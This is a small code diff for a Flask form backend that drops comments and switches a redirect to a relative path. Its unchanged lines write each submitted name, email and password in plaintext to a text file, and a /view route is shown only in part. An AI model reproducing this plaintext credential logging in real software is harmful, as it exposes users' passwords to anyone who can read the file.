@@ -3,7 +3,6 @@ import os
 
 app = Flask(__name__)
 
-# Optional: Enable CORS if frontend and backend are on different domains
 try:
     from flask_cors import CORS
     CORS(app)
@@ -16,12 +15,10 @@ def submit():
     email = request.form.get('email', 'N/A')
     password = request.form.get('password', 'N/A')
 
-    # Save submitted data
     with open('names.txt', 'a') as f:
         f.write(f'Name: {name}, Email: {email}, Password: {password}\n')
 
-    # Redirect to frontend route after successful submission
-    return redirect("http://frontend/submit-success")
+    return redirect("/submit-success")
 
 @app.route('/view', methods=['GET'])
 def view():
